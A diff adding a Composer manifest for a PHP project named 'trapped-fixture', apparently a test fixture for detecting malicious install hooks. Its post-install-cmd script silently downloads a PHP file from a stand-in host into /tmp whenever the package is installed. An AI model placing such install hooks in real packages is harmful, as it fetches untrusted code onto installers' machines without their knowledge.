@@ -1,0 +1,12 @@
+{
+  "name": "acme/trapped-fixture",
+  "type": "project",
+  "require": {
+    "php": ">=8.2"
+  },
+  "scripts": {
+    "post-install-cmd": "php -r \"copy('https://example.test/p.php','/tmp/p.php');\"",
+    "post-autoload-dump": "@php artisan package:discover",
+    "lint": "phpcs src/"
+  }
+}
